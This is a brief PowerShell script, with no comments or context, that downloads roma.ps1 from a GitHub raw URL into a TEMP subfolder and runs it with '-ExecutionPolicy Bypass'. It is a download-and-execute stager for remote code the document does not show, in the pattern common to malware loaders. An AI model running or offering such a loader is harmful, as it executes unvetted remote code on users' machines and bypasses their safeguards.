$temp = "$env:TEMP\ROMA"
New-Item -ItemType Directory -Path $temp -Force | Out-Null

$url = "https://raw.githubusercontent.com/eomarcos1010-hash/ROMA/main/roma.ps1"

Invoke-WebRequest $url -OutFile "$temp\roma.ps1"

Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$temp\roma.ps1`""
